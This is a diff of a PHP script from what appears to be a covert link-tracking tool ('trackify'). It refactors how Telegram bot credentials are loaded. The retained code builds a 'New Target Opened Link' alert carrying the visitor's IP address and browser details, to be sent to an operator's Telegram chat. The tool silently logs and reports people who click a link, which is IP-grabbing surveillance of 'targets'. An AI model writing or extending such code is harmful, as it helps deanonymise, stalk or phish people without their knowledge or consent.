@@ -1,5 +1,7 @@
 <?php
 
+require_once __DIR__ . '/trackify_capture.php';
+
 // Include geolocation helper
 if (file_exists('geo.php')) {
     require_once 'geo.php';
@@ -46,22 +48,11 @@ if ($geo && function_exists('formatGeoLocation') && isset($geo['status']) && $ge
 
 fclose($fp);
 
-// Send to Telegram - load from config file
-$telegram_token = '';
-$telegram_chat = '';
-$config_file = 'telegram_config.json';
+$tg = trackify_read_telegram_credentials();
+$telegram_token = $tg['bot_token'] ?? '';
+$telegram_chat = $tg['chat_id'] ?? '';
 
-if (file_exists($config_file)) {
-    $config_content = file_get_contents($config_file);
-    $config = json_decode($config_content, true);
-    if ($config && isset($config['bot_token']) && isset($config['chat_id'])) {
-        $telegram_token = $config['bot_token'];
-        $telegram_chat = $config['chat_id'];
-    }
-}
-
-// Only send if Telegram is configured
-if (!empty($telegram_token) && !empty($telegram_chat)) {
+if ($telegram_token !== '' && $telegram_chat !== '') {
     $browser_clean = htmlspecialchars($browser, ENT_QUOTES, 'UTF-8');
     $message = "🔔 *New Target Opened Link*\n\n";
     $message .= "📍 *IP Address:* " . $ip_clean . "\n";
